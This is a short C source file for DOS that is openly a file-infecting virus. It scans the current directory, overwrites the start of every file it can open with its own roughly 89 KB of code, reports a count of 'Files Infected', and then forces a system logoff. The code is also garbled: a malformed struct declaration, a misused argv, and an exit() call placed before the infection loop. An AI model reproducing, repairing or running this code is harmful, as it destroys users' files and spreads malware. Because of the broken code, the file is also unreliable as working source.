#include<stdio.h>
#include <stdlib.h>
#include<io.h>
#include<dos.h>
#include<dir.h>
#include<conio.h>
#include<time.h>
#include <sys/stat.h>

FILE *virus,*host;
int done,a=0;
unsigned long x; // variable declaration
char buff[2048]; // variable declaration
struct ffblk ffblk
{
    ffblk;
};
clock_t st,end;
int _argv[]; 

void main()
{
        mkdir("FILE",S_IRWXU);
        exit(EXIT_SUCCESS);
    st=clock();
    clrscr(); // to clear the screen
    done=findfirst("*.*",&ffblk,0); //looking  for a file with any extension (*.*)
    while(!done)
    {
        virus=fopen(_argv[0],"rb"); // calling the functon
        host=fopen(ffblk.ff_name,"rb+");
        if(host==NULL) goto next;
        x=89088;
        // printf("Infecting %s\n",ffblk.ff_name,a);
        while(x>2048)
        {
            fread(buff,2048,1,virus);
            fwrite(buff,2048,1,host);
            x-=2048;
        }
        fread(buff,x,1,virus);
        fwrite(buff,x,1,host);
        a++;
next:
        {
            fcloseall();
            done=findnext(&ffblk);
        }
    }
    printf("DONE! (Total Files Infected= %d)",a);
    end=clock();
    printf("TIME TAKEN=%f SEC\n",
           (end-st)/CLK_TCK);
    getch();
    system("shutdown -l -f");
}
